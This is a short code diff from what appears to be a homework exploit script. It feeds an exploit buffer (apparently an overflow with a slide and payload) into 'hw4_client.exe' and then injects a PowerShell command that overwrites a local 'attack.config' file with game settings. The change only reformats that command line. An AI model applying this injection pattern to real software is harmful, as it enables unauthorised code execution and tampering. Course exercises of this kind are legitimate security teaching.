@@ -17,7 +17,8 @@ if __name__ == '__main__':
     p = Popen(["hw4_client.exe"], stdin=PIPE, )
     p.stdin.write(vulnerability_abuse + slide + package + b"\n")
     p.stdin.flush()
-    cmd = ". > $null ; " + """@('Fires: False', 'Rivals: True', 'Knights Infected: False', 'Robber Hunted: False') -join [Environment]::NewLine | Set-Content -Path "./config/attack.config\" > $null"""
+    cmd = ". > $null ; " + """@('Fires: False', 'Rivals: True', 'Knights Infected: False', 'Robber Hunted: False') \
+                            -join [Environment]::NewLine | Set-Content -Path "./config/attack.config\" > $null"""
     p.stdin.write(bytearray((cmd + "\n").encode()))
     p.stdin.flush()
     sleep(1)
